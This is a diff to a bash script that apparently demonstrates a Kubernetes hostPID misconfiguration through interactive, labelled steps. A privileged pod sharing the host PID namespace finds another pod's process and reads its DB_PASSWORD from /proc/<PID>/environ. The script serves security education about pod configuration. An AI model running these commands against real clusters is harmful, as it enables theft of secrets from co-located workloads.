@@ -1,29 +1,46 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Colors for terminal output
+# Terminal formatting
 RED="\033[0;31m"
 GREEN="\033[0;32m"
 CYAN="\033[0;36m"
-NC="\033[0m" # No Color
+YELLOW="\033[0;33m"
+MAGENTA="\033[0;35m"
+BOLD="\033[1m"
+NC="\033[0m"
 
-# Cleanup function to handle pod removal
-cleanup() {
-    echo -e "\n${CYAN}Cleaning up Kubernetes resources...${NC}"
-    kubectl delete pod target-app inspector-pod --force --grace-period=0 --ignore-not-found=true >/dev/null 2>&1
-    echo -e "${GREEN}Cleanup complete.${NC}"
+# Interactive pause and command runner
+step() {
+    local intent="$1"
+    local cmd="$2"
+    
+    echo -e "\n${YELLOW}----------------------------------------------------${NC}"
+    echo -e "${BOLD}INTENT:${NC} ${intent}"
+    echo -e "${YELLOW}----------------------------------------------------${NC}"
+    echo -e "${MAGENTA}$ ${cmd}${NC}"
+    echo -en "${CYAN}[Press ENTER to execute command...]${NC}"
+    read -r
+    echo ""
+    eval "$cmd"
 }
 
-# Register trap for automatic cleanup on exit or Ctrl+C
+cleanup() {
+    echo -e "\n${CYAN}Triggering cleanup of demo resources...${NC}"
+    kubectl delete pod target-app inspector-pod --force --grace-period=0 --ignore-not-found=true >/dev/null 2>&1
+    echo -e "${GREEN}Cleanup complete. Cluster returned to clean state.${NC}"
+}
+
 trap cleanup EXIT SIGINT
 
+clear
 echo -e "${CYAN}====================================================${NC}"
-echo -e "${CYAN}   Kubernetes hostPID Misconfiguration Demo         ${NC}"
-echo -e "${CYAN}====================================================${NC}\n"
+echo -e "${CYAN}   Interactive Pod Security Misconfiguration Demo    ${NC}"
+echo -e "${CYAN}====================================================${NC}"
 
-# Step 1: Deploy Target Application with a secret environment variable
-echo -e "${CYAN}Step 1: Deploying target application pod with sensitive env variable...${NC}"
-cat <<EOF | kubectl apply -f -
+# --- PHASE 1 ---
+step "PHASE 1: Deploy a normal victim pod carrying a database password in its environment." \
+"cat <<EOF | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
@@ -32,18 +49,18 @@ spec:
   containers:
   - name: target-app
     image: alpine:latest
-    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
+    command: [\"/bin/sh\", \"-c\", \"while true; do sleep 3600; done\"]
     env:
     - name: DB_PASSWORD
-      value: "SuperSecretPassword123!"
-EOF
+      value: \"SuperSecretPassword123!\"
+EOF"
 
-echo -e "${CYAN}Waiting for target-app to be ready...${NC}"
-kubectl wait --for=condition=Ready pod/target-app --timeout=60s
+step "VERIFY: Wait for the victim pod to enter 'Running' state." \
+"kubectl wait --for=condition=Ready pod/target-app --timeout=60s && kubectl get pod target-app -o wide"
 
-# Step 2: Deploy Inspector Pod using hostPID and privileged mode
-echo -e "\n${CYAN}Step 2: Deploying inspector pod with hostPID: true...${NC}"
-cat <<EOF | kubectl apply -f -
+# --- PHASE 2 ---
+step "PHASE 2: Deploy an attacker pod configured with hostPID: true and privileged mode." \
+"cat <<EOF | kubectl apply -f -
 apiVersion: v1
 kind: Pod
 metadata:
@@ -53,27 +70,25 @@ spec:
   containers:
   - name: inspector
     image: alpine:latest
-    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
+    command: [\"/bin/sh\", \"-c\", \"while true; do sleep 3600; done\"]
     securityContext:
       privileged: true
-EOF
+EOF"
 
-echo -e "${CYAN}Waiting for inspector-pod to be ready...${NC}"
-kubectl wait --for=condition=Ready pod/inspector-pod --timeout=60s
+step "VERIFY: Confirm both pods are running on the same host node." \
+"kubectl wait --for=condition=Ready pod/inspector-pod --timeout=60s && kubectl get pods -o wide"
 
-# Step 3: Inspect process memory via host PID namespace
-echo -e "\n${CYAN}Step 3: Demonstrating process and environment variable leakage...${NC}"
+# --- PHASE 3 ---
+step "ATTACKER STEP 1: Scan host processes from inside inspector-pod to find victim workloads." \
+"kubectl exec inspector-pod -- ps -ef | grep 'sleep 3600' | grep -v grep"
 
-TARGET_PID=$(kubectl exec inspector-pod -- /bin/sh -c "ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \$1}' | head -n 1")
+step "ATTACKER STEP 2: Extract the Host PID of the victim process." \
+"export TARGET_PID=\$(kubectl exec inspector-pod -- /bin/sh -c \"ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \\\$1}' | head -n 1\") && echo \"Target Process Host PID: \$TARGET_PID\""
 
-if [ -n "$TARGET_PID" ]; then
-    echo -e "${GREEN}Found target process on host PID: ${TARGET_PID}${NC}"
-    echo -e "${CYAN}Extracting secret from /proc/${TARGET_PID}/environ via inspector-pod:${NC}\n"
-    
-    # Read environment variables directly from procfs
-    kubectl exec inspector-pod -- /bin/sh -c "cat /proc/${TARGET_PID}/environ | tr '\0' '\n' | grep DB_PASSWORD" || true
-else
-    echo -e "${RED}Could not locate target process PID.${NC}"
-fi
+step "ATTACKER STEP 3: Inspect /proc/<PID>/environ from inspector-pod to dump victim memory." \
+"kubectl exec inspector-pod -- /bin/sh -c \"cat /proc/\\\$(ps -ef | grep 'sleep 3600' | grep -v grep | awk '{print \\\$1}' | head -n 1)/environ | tr '\\\\0' '\\\\n' | grep DB_PASSWORD\""
 
-echo -e "\n${CYAN}Demo finished. Triggering cleanup...${NC}"
+step "AUDIT: Inspect Kubernetes cluster events proving scheduling and execution timestamps." \
+"kubectl get events --field-selector involvedObject.kind=Pod --sort-by='.metadata.creationTimestamp' | tail -n 6"
+
+echo -e "\n${GREEN}Demo walkthrough completed successfully!${NC}"
